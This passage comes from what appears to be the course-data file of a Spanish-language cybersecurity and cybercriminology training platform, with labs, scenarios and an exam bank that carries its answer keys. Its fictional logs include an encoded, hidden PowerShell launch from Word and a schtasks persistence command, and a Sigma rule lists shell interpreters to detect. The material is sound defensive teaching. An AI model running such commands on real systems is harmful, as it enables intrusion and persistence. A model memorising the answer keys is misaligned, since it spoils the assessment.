          { type: 'text', icon: 'AlarmIcon', text: "El examen final toma 12 preguntas al azar de un banco de 16 y exige 80%. Al aprobarlo obtendrá el badge de Analista de Ciberseguridad · Nivel Avanzado." },
        ]
      },
      {
        id: 'aca_hunting',
        title: "2. 🚩 Laboratorio: Threat Hunting con MITRE ATT&CK",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "El threat hunting parte de una hipótesis basada en técnicas reales, por ejemplo: \"Si un atacante entró por un documento con macros, veremos procesos de Office lanzando intérpretes de comandos\". Luego se busca en los registros (como los eventos de creación de procesos de Sysmon, ID 1) y se confirma o descarta." },
          {
            type: 'challenge',
            title: 'Hipótesis: un documento de Office lanzó código',
            brief: "Eventos ficticios de creación de procesos (Sysmon, ID 1) de tres equipos. Confirme o descarte la hipótesis.",
            artifacts: [
              {
                name: 'sysmon_procesos.txt',
                content: `equipo    hora      proceso_padre                 proceso                          línea de comandos
PC-031    09:14:02  C:\\...\\explorer.exe            C:\\...\\WINWORD.EXE              "Propuesta_proveedor.docm"
PC-031    09:14:20  C:\\...\\WINWORD.EXE             C:\\...\\powershell.exe           powershell -nop -w hidden -enc JABjAD0A...
PC-031    09:14:31  C:\\...\\powershell.exe          C:\\...\\schtasks.exe             schtasks /create /sc onlogon /tn "OneDriveSync" /tr C:\\Users\\Public\\upd.exe
PC-044    10:02:11  C:\\...\\explorer.exe            C:\\...\\EXCEL.EXE                "Informe_ventas.xlsx"
PC-052    11:40:03  C:\\...\\services.exe            C:\\...\\svchost.exe              svchost.exe -k netsvcs`,
              },
            ],
            questions: [
              { prompt: '¿En qué equipo se confirma la hipótesis?', answers: ['PC-031', 'pc031', 'pc-31'], explanation: 'En PC-031, WINWORD.EXE lanzó powershell.exe: un documento .docm (con macros) ejecutó código.' },
              { prompt: '¿Qué técnica de ATT&CK usa schtasks /create para persistir? (identificador, ej. T1053.005)', answers: ['T1053.005', 't1053.005', 'T1053'], explanation: 'T1053.005 (Tarea programada): crea una tarea que se ejecuta en cada inicio de sesión, con un nombre que imita a OneDrive para pasar desapercibida.' },
              { prompt: '¿Qué ejecutable se programó para persistir? (ruta o nombre)', answers: ['upd.exe', 'C:\\Users\\Public\\upd.exe', 'c:\\users\\public\\upd.exe'], explanation: 'upd.exe en C:\\Users\\Public: una ubicación escribible por cualquier usuario, típica de malware.' },
            ],
          },
        ]
      },
      {
        id: 'aca_detection',
        title: "3. 🚩 Ingeniería de Detección con Sigma",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Lo que se descubre en una cacería se convierte en una regla para no tener que buscarlo de nuevo. Sigma es un formato abierto para escribir reglas de detección una sola vez y traducirlas a distintos SIEM. Cada regla define la fuente de registros, las condiciones y su nivel de severidad." },
          { type: 'text', icon: 'CheckCircleIcon', text: "Una buena regla equilibra cobertura y ruido: si genera cientos de falsos positivos, el equipo terminará ignorándola. Se prueba con datos reales antes de activarla." },
          {
            type: 'challenge',
            title: 'Evalúe la regla antes de activarla',
            brief: "Esta regla Sigma ficticia busca procesos de Office que lanzan intérpretes de comandos. Revise la regla y los eventos de prueba.",
            artifacts: [
              {
                name: 'regla_office_shell.yml',
                content: `title: Office lanza un intérprete de comandos
logsource:
  category: process_creation
  product: windows
detection:
  padre_office:
    ParentImage|endswith:
      - '\\WINWORD.EXE'
      - '\\EXCEL.EXE'
      - '\\POWERPNT.EXE'
  hijo_shell:
    Image|endswith:
      - '\\powershell.exe'
      - '\\cmd.exe'
      - '\\wscript.exe'
  condition: padre_office and hijo_shell
level: high`,
              },
              {
                name: 'eventos_prueba.txt',
                content: `E1  ParentImage=...\\WINWORD.EXE   Image=...\\powershell.exe
E2  ParentImage=...\\EXCEL.EXE    Image=...\\splwow64.exe
E3  ParentImage=...\\explorer.exe Image=...\\powershell.exe
E4  ParentImage=...\\EXCEL.EXE    Image=...\\cmd.exe`,
              },
            ],
            questions: [
              { prompt: '¿Qué campo identifica al proceso padre en la regla?', answers: ['ParentImage', 'parentimage'], explanation: 'ParentImage es el proceso padre; Image, el proceso que se crea.' },
              { prompt: '¿Cuántos de los 4 eventos de prueba activan la regla? (número)', answers: ['2', 'dos'], explanation: 'E1 (Word → PowerShell) y E4 (Excel → cmd). E2 tiene un hijo que no es un intérprete; E3 tiene un padre que no es Office.' },
              { prompt: '¿Qué nivel de severidad tiene la regla?', answers: ['high', 'alto', 'alta'], explanation: 'level: high. Es razonable: un documento de Office rara vez necesita lanzar un intérprete de comandos.' },
            ],
          },
        ]
      },
      {
        id: 'aca_cloud',
        title: "4. Seguridad en la Nube",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "En la nube rige el modelo de responsabilidad compartida: el proveedor protege la infraestructura, pero la configuración, las identidades, los permisos y los datos son responsabilidad del cliente. La mayoría de los incidentes en la nube vienen de configuraciones erróneas, no de fallas del proveedor." },
          {
            type: 'scenario',
            title: 'Caso 1: el almacenamiento público',
            intro: "Un investigador avisa a una entidad ficticia que encontró un contenedor de almacenamiento en la nube con documentos de asociados, accesible sin autenticación. Necesita 60 de 80 puntos.",
            start: 'n1',
            maxPoints: 80,
            passPoints: 60,
            steps: {
              n1: {
                text: "¿Qué hace primero?",
                choices: [
                  { text: "Bloqueo el acceso público del contenedor de inmediato y preservo sus registros de acceso.", next: 'n2', points: 20, feedback: "Correcto: se corta la exposición y se conserva la evidencia de quién accedió." },
                  { text: "Borro el contenedor para que nadie lo vea.", next: 'n2', points: -10, feedback: "Borrar destruye la evidencia y quizá datos necesarios para la operación." },
                ]
              },
              n2: {
                text: "Los registros muestran descargas desde IP desconocidas durante semanas. ¿Qué implica?",
                choices: [
                  { text: "Es un incidente de datos personales: hay que evaluar el alcance, activar el procedimiento de respuesta y preparar el reporte a la SIC.", next: 'n3', points: 20, feedback: "Bien: la exposición se convirtió en una posible fuga de datos personales." },
                  { text: "Como no hubo \"hackeo\", no hay incidente.", next: 'n3', points: -10, feedback: "Una exposición con descargas de terceros es un incidente, aunque nadie haya \"roto\" nada." },
                ]
              },
              n3: {
                text: "¿Cuál fue la causa raíz más probable?",
                choices: [
                  { text: "Una configuración de acceso público hecha para una prueba y nunca revertida, sin revisión periódica de la configuración.", next: 'n4', points: 20, feedback: "Correcto: es el patrón más común en la nube." },
                  { text: "Una falla del proveedor de nube.", next: 'n4', points: 0, feedback: "En el modelo compartido, la configuración es responsabilidad del cliente." },
                ]
              },
              n4: {
                text: "¿Qué control propone para que no se repita?",
                choices: [
                  { text: "Bloqueo del acceso público por política a nivel de cuenta, revisión continua de configuración (CSPM), mínimo privilegio y alertas de cambios.", next: 'fin', points: 20, feedback: "Excelente: controles preventivos y de detección." },
                  { text: "Pedir a todos que tengan más cuidado.", next: 'fin', points: 0, feedback: "Sin controles técnicos, el error se repetirá." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'aca_zerotrust',
        title: "5. Arquitectura Zero Trust y Segmentación",
        content: [
          { type: 'text', icon: 'LockIcon', text: "Zero Trust (descrita en NIST SP 800-207) parte de \"nunca confiar, siempre verificar\": estar dentro de la red no da acceso por sí mismo. Cada acceso se evalúa según la identidad, el estado del dispositivo y el contexto, con el mínimo privilegio necesario." },
          { type: 'text', icon: 'ServerIcon', text: "La segmentación limita el movimiento lateral: si un equipo de oficina se compromete, no debería poder llegar directamente a los servidores de la base de datos ni a los respaldos." },
          {
            type: 'flashcards',
            title: 'Principios Zero Trust en la práctica',
            cards: [
              { front: 'Verificar explícitamente', back: 'Cada acceso se autentica y autoriza con identidad fuerte (MFA), estado del dispositivo y contexto.' },
              { front: 'Mínimo privilegio', back: 'Acceso justo a lo necesario y por el tiempo necesario (por ejemplo, permisos de administración temporales).' },
              { front: 'Asumir el compromiso', back: 'Diseñar como si el atacante ya estuviera dentro: segmentar, cifrar y monitorear para limitar el daño.' },
              { front: 'Microsegmentación', back: 'Dividir la red en zonas pequeñas con reglas estrictas entre ellas, para frenar el movimiento lateral.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "En una red plana, un portátil comprometido llega a los servidores de respaldo. ¿Qué principio habría limitado el daño?",
              options: [
                "Confiar en todo lo que está dentro de la red.",
                "Segmentación y mínimo privilegio, asumiendo que un equipo podía ser comprometido.",
                "Cambiar el fondo de pantalla corporativo."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: con segmentación, el portátil no tendría camino directo a los respaldos.",
                incorrect: "La confianza implícita en la red interna es justamente lo que Zero Trust elimina."
              }
            }
          },
        ]
      },
      {
        id: 'aca_pentest',
        title: "6. 🚩 Priorizar un Informe de Pentest",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Un informe de pruebas de penetración no se lee de arriba hacia abajo: se buscan las cadenas de ataque, es decir, cómo varios hallazgos medios se combinan en un compromiso crítico. Corregir el eslabón que rompe la cadena puede valer más que corregir el hallazgo con mayor puntaje aislado." },
          {
            type: 'challenge',
            title: 'Cinco hallazgos, una cadena',
            brief: "Resumen ficticio de un pentest autorizado. Identifique la cadena de ataque y qué corregir primero.",
            artifacts: [
              {
                name: 'hallazgos_pentest.txt',
                content: `H1  Media    Portal de empleados sin límite de intentos de inicio de sesión
H2  Media    Contraseñas por defecto en la cuenta "soporte" del portal
H3  Alta     El portal permite subir archivos sin validar su tipo (ejecución de código en el servidor)
H4  Baja     Encabezados HTTP de seguridad ausentes
H5  Media    El servidor del portal puede conectarse directamente a la base de datos de nómina
Cadena demostrada: H2 → H3 → H5  (acceso al portal → control del servidor → lectura de la nómina)`,
              },
            ],
            questions: [
              { prompt: '¿Qué hallazgo da el acceso inicial en la cadena demostrada? (ej. H1)', answers: ['H2', 'h2'], explanation: 'H2: la contraseña por defecto de "soporte" abre la puerta.' },
              { prompt: '¿Qué hallazgo permite ejecutar código en el servidor?', answers: ['H3', 'h3'], explanation: 'H3: subir archivos sin validar permite cargar código y ejecutarlo.' },
              { prompt: '¿Qué hallazgo de severidad "Baja" puede dejarse para después sin afectar la cadena?', answers: ['H4', 'h4'], explanation: 'H4 no participa en la cadena. Romper H2 (cambiar la contraseña) es lo más rápido; H3 y H5 se corrigen después para que la cadena no se rearme por otro camino.' },
            ],
          },
        ]
      },
      {
        id: 'aca_capstone',
        title: "7. 🧩 Caso Integrador: Turno Nocturno en el SOC",
        content: [
          { type: 'text', icon: 'AlarmIcon', text: "Es la 1:00 a. m. y usted está solo en el turno del SOC de una entidad ficticia. Las alertas empiezan a llegar. Este caso integra detección, priorización, contención y comunicación." },
          {
            type: 'scenario',
            title: 'Caso integrador: la noche de las cinco alertas',
            intro: "Cinco alertas en 20 minutos. Necesita 80 de 100 puntos.",
            start: 'z1',
            maxPoints: 100,
            passPoints: 80,
            steps: {
              z1: {
                text: "Llegan: (1) escaneo externo bloqueado, (2) inicio de sesión de un administrador desde otro país, (3) antivirus que eliminó un adjunto, (4) disco casi lleno en un servidor, (5) creación de una cuenta nueva en el dominio a la 1:05 a. m. ¿Qué atiende primero?",
                choices: [
                  { text: "La 2 y la 5 juntas: un administrador desde otro país y una cuenta creada a esa hora pueden ser el mismo ataque en curso.", next: 'z2', points: 20, feedback: "Correcto: correlacionar las alertas revela el incidente real." },
                  { text: "La 1, porque llegó primero.", next: 'z2', points: 0, feedback: "Un escaneo bloqueado es ruido; el orden de llegada no es el riesgo." },
                ]
              },
              z2: {
                text: "Confirma que la cuenta nueva la creó el administrador conectado desde el exterior, que no está de viaje. ¿Qué hace?",
                choices: [
                  { text: "Deshabilito ambas cuentas, cierro sus sesiones y aíslo los equipos desde donde operaron, según el playbook de cuentas comprometidas.", next: 'z3', points: 20, feedback: "Bien: contención inmediata del acceso del atacante." },
                  { text: "Espero a la mañana para consultarlo con el jefe.", next: 'z3', points: -10, feedback: "Unas horas de ventaja permiten al atacante desplegar ransomware." },
                ]
              },
              z3: {
                text: "El playbook exige escalar a ciertos niveles. ¿A quién avisa ahora?",
                choices: [
                  { text: "Al líder de respuesta a incidentes de guardia, según la matriz de escalamiento, con un resumen de lo observado y lo hecho.", next: 'z4', points: 20, feedback: "Correcto: un incidente de cuenta administradora comprometida no se maneja solo." },
                  { text: "A nadie: ya lo contuve.", next: 'z4', points: -10, feedback: "Pueden existir otros accesos del atacante; se necesita al equipo completo." },
                ]
              },
              z4: {
                text: "Mientras llega el equipo, ¿qué busca?",
                choices: [
                  { text: "Otras acciones de esas cuentas: tareas programadas, nuevos servicios, accesos a otros servidores y cambios en los respaldos.", next: 'z5', points: 20, feedback: "Excelente: busca persistencia y movimiento lateral antes de que se usen." },
                  { text: "Reviso por qué el disco del servidor está lleno.", next: 'z5', points: 0, feedback: "Puede esperar: no es la prioridad en este momento." },
                ]
              },
              z5: {
                text: "Al amanecer, ¿qué entrega?",
                choices: [
                  { text: "Un informe con línea de tiempo, alertas correlacionadas, acciones de contención, indicadores encontrados y una regla de detección nueva para este patrón.", next: 'fin', points: 20, feedback: "Cierre de nivel avanzado: lo aprendido se convierte en detección." },
                  { text: "Un mensaje: \"Hubo algo raro, ya está controlado\".", next: 'fin', points: 0, feedback: "Sin detalle, el equipo no puede continuar ni aprender." },
                ]
              },
              fin: { text: "Fin del turno. Si aprobó, está listo para el examen final." },
            }
          },
        ]
      },
      {
        id: 'aca_exam',
        title: "8. 📝 Examen del Nivel Avanzado",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Examen final de la ruta Analista de Ciberseguridad: 12 preguntas al azar de un banco de 16, con 80% para aprobar." },
          {
            type: 'exam',
            title: 'Examen: Analista de Ciberseguridad · Avanzado',
            description: 'Evalúa threat hunting, ingeniería de detección, nube, Zero Trust, priorización de pentest y operación del SOC.',
            passPercent: 80,
            questionsPerAttempt: 12,
            questions: [
              { question: '¿De qué parte el threat hunting?', options: [{ id: 'x1a', text: 'De una hipótesis basada en técnicas reales de atacantes.', isCorrect: true, score: 10 }, { id: 'x1b', text: 'De esperar a que llegue una alerta.', isCorrect: false, score: 0 }, { id: 'x1c', text: 'De reinstalar los equipos.', isCorrect: false, score: 0 }], feedback: 'Es proactivo.' },
              { question: 'WINWORD.EXE lanza powershell.exe con un comando codificado. ¿Qué sugiere?', options: [{ id: 'x2a', text: 'Un documento con macros que ejecutó código malicioso.', isCorrect: true, score: 10 }, { id: 'x2b', text: 'Una actualización normal de Office.', isCorrect: false, score: 0 }, { id: 'x2c', text: 'Nada relevante.', isCorrect: false, score: 0 }], feedback: 'Es un patrón clásico de acceso inicial.' },
              { question: '¿Qué técnica de ATT&CK es la creación de una tarea programada para persistir?', options: [{ id: 'x3a', text: 'T1053.005.', isCorrect: true, score: 10 }, { id: 'x3b', text: 'T1566.', isCorrect: false, score: 0 }, { id: 'x3c', text: 'T1486.', isCorrect: false, score: 0 }], feedback: 'T1566 es phishing y T1486 cifrado para impacto.' },
              { question: '¿Qué evento de Sysmon registra la creación de procesos?', options: [{ id: 'x4a', text: 'El ID 1.', isCorrect: true, score: 10 }, { id: 'x4b', text: 'El ID 1102.', isCorrect: false, score: 0 }, { id: 'x4c', text: 'El ID 4625.', isCorrect: false, score: 0 }], feedback: '1102 y 4625 son eventos de seguridad de Windows.' },
              { question: '¿Qué es Sigma?', options: [{ id: 'x5a', text: 'Un formato abierto para escribir reglas de detección traducibles a distintos SIEM.', isCorrect: true, score: 10 }, { id: 'x5b', text: 'Un antivirus.', isCorrect: false, score: 0 }, { id: 'x5c', text: 'Un tipo de malware.', isCorrect: false, score: 0 }], feedback: 'Se escribe una vez y se usa en varias plataformas.' },
              { question: 'Una regla de detección genera cientos de falsos positivos al día. ¿Qué riesgo hay?', options: [{ id: 'x6a', text: 'Que el equipo termine ignorándola y pase por alto el ataque real.', isCorrect: true, score: 10 }, { id: 'x6b', text: 'Ninguno: más alertas es mejor.', isCorrect: false, score: 0 }, { id: 'x6c', text: 'Que el SIEM se vuelva más rápido.', isCorrect: false, score: 0 }], feedback: 'La fatiga de alertas es un riesgo real.' },
              { question: 'En el modelo de responsabilidad compartida de la nube, ¿de quién es la configuración de permisos?', options: [{ id: 'x7a', text: 'Del cliente.', isCorrect: true, score: 10 }, { id: 'x7b', text: 'Del proveedor de nube.', isCorrect: false, score: 0 }, { id: 'x7c', text: 'De nadie.', isCorrect: false, score: 0 }], feedback: 'El proveedor protege la infraestructura.' },
              { question: 'Un almacenamiento en la nube con datos personales quedó público y hubo descargas de terceros. ¿Es un incidente?', options: [{ id: 'x8a', text: 'Sí: es una posible fuga de datos personales, aunque nadie "rompiera" nada.', isCorrect: true, score: 10 }, { id: 'x8b', text: 'No, porque no hubo hackeo.', isCorrect: false, score: 0 }, { id: 'x8c', text: 'Solo si sale en las noticias.', isCorrect: false, score: 0 }], feedback: 'Debe evaluarse y reportarse.' },
              { question: '¿Qué hace una herramienta CSPM?', options: [{ id: 'x9a', text: 'Revisa continuamente la configuración de la nube en busca de errores.', isCorrect: true, score: 10 }, { id: 'x9b', text: 'Cifra los correos.', isCorrect: false, score: 0 }, { id: 'x9c', text: 'Reemplaza el firewall.', isCorrect: false, score: 0 }], feedback: 'Cloud Security Posture Management.' },
              { question: '¿Qué documento del NIST describe la arquitectura Zero Trust?', options: [{ id: 'x10a', text: 'NIST SP 800-207.', isCorrect: true, score: 10 }, { id: 'x10b', text: 'NIST SP 800-61.', isCorrect: false, score: 0 }, { id: 'x10c', text: 'NIST SP 800-115.', isCorrect: false, score: 0 }], feedback: '800-61 es respuesta a incidentes y 800-115 pruebas de seguridad.' },
              { question: '¿Qué significa "asumir el compromiso" en Zero Trust?', options: [{ id: 'x11a', text: 'Diseñar como si el atacante ya estuviera dentro, para limitar el daño.', isCorrect: true, score: 10 }, { id: 'x11b', text: 'Rendirse ante los atacantes.', isCorrect: false, score: 0 }, { id: 'x11c', text: 'No monitorear nada.', isCorrect: false, score: 0 }], feedback: 'Lleva a segmentar, cifrar y vigilar.' },
              { question: '¿Qué limita principalmente la microsegmentación?', options: [{ id: 'x12a', text: 'El movimiento lateral.', isCorrect: true, score: 10 }, { id: 'x12b', text: 'El phishing.', isCorrect: false, score: 0 }, { id: 'x12c', text: 'El consumo de energía.', isCorrect: false, score: 0 }], feedback: 'Un equipo comprometido no llega a todo.' },
              { question: 'En un informe de pentest, ¿qué es una cadena de ataque?', options: [{ id: 'x13a', text: 'Varios hallazgos combinados que llevan a un compromiso mayor.', isCorrect: true, score: 10 }, { id: 'x13b', text: 'La lista de hallazgos ordenada por fecha.', isCorrect: false, score: 0 }, { id: 'x13c', text: 'Un tipo de malware.', isCorrect: false, score: 0 }], feedback: 'Romper un eslabón puede detener toda la cadena.' },
              { question: 'Llegan varias alertas a la vez. ¿Cómo se priorizan?', options: [{ id: 'x14a', text: 'Correlacionándolas y atendiendo primero lo que indica un ataque en curso.', isCorrect: true, score: 10 }, { id: 'x14b', text: 'Por orden de llegada.', isCorrect: false, score: 0 }, { id: 'x14c', text: 'Por la que tenga el título más largo.', isCorrect: false, score: 0 }], feedback: 'La correlación revela el incidente real.' },
              { question: 'Confirmada una cuenta administradora comprometida de madrugada, ¿qué hace el analista?', options: [{ id: 'x15a', text: 'Contiene (deshabilita, cierra sesiones, aísla) y escala según la matriz.', isCorrect: true, score: 10 }, { id: 'x15b', text: 'Espera a la mañana.', isCorrect: false, score: 0 }, { id: 'x15c', text: 'Lo publica en redes.', isCorrect: false, score: 0 }], feedback: 'Horas de ventaja pueden ser fatales.' },
              { question: '¿Cómo cierra un analista avanzado un incidente nuevo?', options: [{ id: 'x16a', text: 'Con un informe y una regla de detección para ese patrón.', isCorrect: true, score: 10 }, { id: 'x16b', text: 'Borrando los registros.', isCorrect: false, score: 0 }, { id: 'x16c', text: 'Sin documentar nada.', isCorrect: false, score: 0 }], feedback: 'Lo aprendido se convierte en detección.' },
            ],
          },
        ]
      },
    ]
  },
  cybercriminology_intermedio: {
    title: "Analista en Cibercriminología · Nivel Intermedio",
    description: "Teorías criminológicas aplicadas al ciberespacio: actividades rutinarias, elección racional, aprendizaje social, neutralización y espacio transicional; victimología digital y prevención situacional. Laboratorios prácticos y examen con nota mínima del 70%.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'cri_intro',
        title: "1. 🗺️ Bienvenida al Nivel Intermedio",
        content: [
          { type: 'text', icon: 'BrainCircuitIcon', text: "En el Nivel Básico se preguntó por qué ocurre el cibercrimen. Ahora usará las teorías de la criminología para explicar casos concretos, entender a las víctimas y diseñar prevención. El objetivo: pasar de la intuición al análisis." },
          { type: 'text', icon: 'AlarmIcon', text: "Este nivel incluye laboratorios de decisión, retos de análisis y un examen que se aprueba con 70%. Todos los casos y personas son ficticios." },
        ]
      },
      {
        id: 'cri_theories',
        title: "2. Teorías Criminológicas en el Ciberespacio",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "Ninguna teoría explica todo el cibercrimen, pero cada una ilumina una parte: por qué ocurre en cierto momento y lugar, cómo decide el delincuente, cómo aprende, cómo justifica su conducta y por qué el ciberespacio cambia el comportamiento." },
          {
            type: 'interactive',
            title: 'Las teorías clave',
            items: [
              { term: 'Actividades rutinarias (Cohen y Felson, 1979)', definition: 'El delito ocurre cuando coinciden un delincuente motivado, un objetivo adecuado y la ausencia de un guardián capaz. En línea, el "guardián" puede ser un antivirus, el doble factor o un moderador.' },
              { term: 'Elección racional (Cornish y Clarke)', definition: 'El delincuente sopesa costos, beneficios y riesgos. Si el esfuerzo sube o la recompensa baja, el delito pierde atractivo.' },
              { term: 'Aprendizaje social (Akers)', definition: 'La conducta delictiva se aprende de otros: técnicas, motivos y justificaciones, hoy a menudo en foros y comunidades en línea.' },
              { term: 'Autocontrol (Gottfredson y Hirschi, 1990)', definition: 'El bajo autocontrol, sumado a la oportunidad, aumenta la probabilidad de delinquir; también se ha estudiado en víctimas que toman riesgos en línea.' },
              { term: 'Neutralización (Sykes y Matza, 1957)', definition: 'Los delincuentes usan justificaciones para acallar su culpa: "no le hice daño a nadie", "el banco se lo merecía".' },
              { term: 'Espacio transicional (Jaishankar, 2008)', definition: 'Teoría propia del cibercrimen: las personas se comportan distinto en línea por el anonimato, la falta de disuasión y la facilidad de moverse entre el espacio físico y el virtual.' },
            ]
          },
          {
            type: 'memory',
            title: 'Asocie cada teoría con su idea central',
            pairs: [
              { term: 'Actividades rutinarias', definition: 'Delincuente motivado + objetivo adecuado + sin guardián capaz.' },
              { term: 'Elección racional', definition: 'Costos, beneficios y riesgos.' },
              { term: 'Aprendizaje social', definition: 'Se aprende de otros, también en foros.' },
              { term: 'Neutralización', definition: 'Justificaciones para acallar la culpa.' },
              { term: 'Espacio transicional', definition: 'El anonimato cambia la conducta en línea.' },
            ]
          },
        ]
      },
      {
        id: 'cri_rat',
        title: "3. 🧪 Laboratorio: Actividades Rutinarias en un Caso Real",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "La teoría de las actividades rutinarias es muy útil para prevenir: si se elimina cualquiera de los tres elementos, el delito se vuelve menos probable. Aplíquela a un caso." },
          {
            type: 'scenario',
            title: 'Caso 1: las cuentas de los adultos mayores',
            intro: "En una ciudad ficticia, se multiplican los robos a cuentas bancarias de adultos mayores mediante llamadas que piden códigos de verificación. Analice el caso con la teoría. Necesita 40 de 60 puntos.",
            start: 't1',
            maxPoints: 60,
            passPoints: 40,
            steps: {
              t1: {
                text: "¿Qué hace que los adultos mayores sean un \"objetivo adecuado\" para estos delincuentes?",
                choices: [
                  { text: "Tienen ahorros, suelen ser menos familiares con las tácticas digitales y responden con confianza a quien dice ser del banco.", next: 't2', points: 20, feedback: "Correcto: valor, vulnerabilidad y accesibilidad hacen al objetivo atractivo." },
                  { text: "Que usan más internet que los jóvenes.", next: 't2', points: 0, feedback: "No es lo que los convierte en objetivo; lo es la combinación de valor y menor familiaridad con estos engaños." },
                ]
              },
              t2: {
                text: "¿Qué \"guardián capaz\" falta en estos casos?",
                choices: [
                  { text: "Un familiar o la entidad que valide operaciones inusuales, alertas del banco ante transferencias atípicas y el conocimiento de que el banco nunca pide códigos.", next: 't3', points: 20, feedback: "Bien: el guardián puede ser una persona, una tecnología o un conocimiento." },
                  { text: "Un policía en cada casa.", next: 't3', points: 0, feedback: "Poco realista: el guardián en línea suele ser tecnológico o social, no un agente presente." },
                ]
              },
              t3: {
                text: "¿Qué intervención actúa sobre el elemento más fácil de modificar?",
                choices: [
                  { text: "Fortalecer los guardianes: alertas bancarias y límites a transferencias nuevas, más campañas dirigidas a adultos mayores y sus familias.", next: 'fin', points: 20, feedback: "Correcto: eliminar la motivación del delincuente es difícil; reforzar al guardián es viable y efectivo." },
                  { text: "Convencer a los delincuentes de que cambien de actividad.", next: 'fin', points: 0, feedback: "La motivación del delincuente es el elemento más difícil de modificar a corto plazo." },
                ]
              },
              fin: { text: "Fin del caso. Revise su puntaje y la retroalimentación." },
            }
          },
        ]
      },
      {
        id: 'cri_neutralization',
        title: "4. 🚩 Laboratorio: Técnicas de Neutralización",
        content: [
          { type: 'text', icon: 'SpyIcon', text: "Sykes y Matza describieron cinco técnicas: negación de la responsabilidad (\"no fue mi culpa\"), negación del daño (\"nadie salió herido\"), negación de la víctima (\"se lo merecía\"), condena de quienes condenan (\"ellos son peores\") y apelación a lealtades superiores (\"lo hice por mi grupo\")." },
          {
            type: 'challenge',
            title: 'Lo que dicen en el foro',
            brief: "Fragmentos ficticios de un foro donde se venden datos robados. Identifique la técnica de neutralización de cada uno. Responda con: responsabilidad, daño, víctima, condenadores o lealtades.",
            artifacts: [
              {
                name: 'foro_extractos.txt',
                content: `[A] "Los bancos tienen seguro, la gente recupera su plata. Nadie pierde nada de verdad."
[B] "Esa empresa vendía nuestros datos sin permiso; que ahora les pase a ellos es justicia."
[C] "Los políticos roban millones y nadie dice nada. ¿Y me van a juzgar a mí?"
[D] "Yo solo vendo las listas, lo que haga el comprador no es mi problema."
[E] "Lo hago por el colectivo; si yo no consigo el acceso, otro del grupo queda mal."`,
              },
            ],
            questions: [
              { prompt: '¿Qué técnica usa el fragmento [A]?', answers: ['daño', 'negacion del daño', 'negación del daño', 'dano'], explanation: '[A] niega el daño: "nadie pierde nada" minimiza el perjuicio real a las víctimas.' },
              { prompt: '¿Qué técnica usa el fragmento [B]?', answers: ['víctima', 'victima', 'negacion de la victima', 'negación de la víctima'], explanation: '[B] niega a la víctima: la empresa "se lo merecía".' },
              { prompt: '¿Qué técnica usa el fragmento [C]?', answers: ['condenadores', 'condena de los condenadores', 'condena de quienes condenan'], explanation: '[C] condena a quienes condenan: desvía la atención hacia la conducta de otros.' },
              { prompt: '¿Qué técnica usa el fragmento [D]?', answers: ['responsabilidad', 'negacion de la responsabilidad', 'negación de la responsabilidad'], explanation: '[D] niega la responsabilidad: atribuye el daño al comprador.' },
              { prompt: '¿Qué técnica usa el fragmento [E]?', answers: ['lealtades', 'lealtades superiores', 'apelacion a lealtades superiores', 'apelación a lealtades superiores'], explanation: '[E] apela a lealtades superiores: el grupo pesa más que la norma.' },
            ],
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Para qué sirve identificar estas justificaciones en prevención?",
              options: [
                "Para nada: son solo excusas.",
                "Para diseñar mensajes que las desmonten (por ejemplo, mostrar el daño real a las víctimas) y \"eliminar excusas\" antes de que alguien delinca.",
                "Para justificar los delitos."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto: las campañas que muestran el daño real y la responsabilidad individual atacan directamente estas justificaciones.",
                incorrect: "Entender las justificaciones permite desmontarlas: es una herramienta de prevención."
              }
            }
          },
        ]
      },
      {
        id: 'cri_victims',
        title: "5. Victimología Digital",
        content: [
          { type: 'text', icon: 'HappyUsersIcon', text: "La victimología estudia a las víctimas: por qué algunas personas o grupos son victimizados más, cómo las afecta y cómo atenderlas sin revictimizarlas. En línea, la vergüenza hace que muchas víctimas no denuncien, sobre todo en fraudes afectivos y sextorsión." },
          { type: 'text', icon: 'LockIcon', text: "Revictimizar es dañar de nuevo: culpar a la víctima (\"¿cómo fue tan ingenua?\"), hacerla repetir su historia muchas veces o difundir su caso. Una buena atención cree, orienta, protege la evidencia y deriva a apoyo." },
          {
            type: 'scenario',
            title: 'Caso 2: Andrés y la sextorsión',
            intro: "Andrés, de 17 años, le cuenta a un docente ficticio que alguien con quien chateaba amenaza con difundir imágenes íntimas si no paga. Usted orienta al docente. Necesita 60 de 80 puntos.",
            start: 'v1',
            maxPoints: 80,
            passPoints: 60,
            steps: {
              v1: {
                text: "¿Cuál es la primera reacción adecuada del docente?",
                choices: [
                  { text: "Creerle, decirle que no es su culpa y que hizo bien en contarlo, y que no está solo.", next: 'v2', points: 20, feedback: "Correcto: la primera respuesta define si la víctima sigue pidiendo ayuda." },
                  { text: "Regañarlo por haber enviado las imágenes.", next: 'v2', points: -10, feedback: "Es revictimización: aumenta la vergüenza y puede llevarlo a ceder ante el extorsionador." },
                ]
              },
              v2: {
                text: "¿Debe Andrés pagar para que no difundan las imágenes?",
                choices: [
                  { text: "No: pagar no garantiza nada y suele traer más exigencias. Lo recomendable es no responder más, no borrar la conversación y bloquear después de preservarla.", next: 'v3', points: 20, feedback: "Correcto: el pago alimenta la extorsión." },
                  { text: "Sí, para terminar rápido.", next: 'v3', points: -10, feedback: "En la mayoría de los casos, pagar lleva a nuevas exigencias." },
                ]
              },
              v3: {
                text: "Andrés es menor de edad. ¿Qué se hace con el caso?",
                choices: [
                  { text: "Informar a su familia o acudientes y a las rutas de protección, reportar por canales como Te Protejo y el CAI Virtual, y denunciar ante la Fiscalía.", next: 'v4', points: 20, feedback: "Bien: con menores, la protección y la denuncia son obligatorias." },
                  { text: "Manejarlo en secreto entre el docente y Andrés.", next: 'v4', points: -10, feedback: "El caso involucra a un menor: debe activarse la ruta de protección." },
                ]
              },
              v4: {
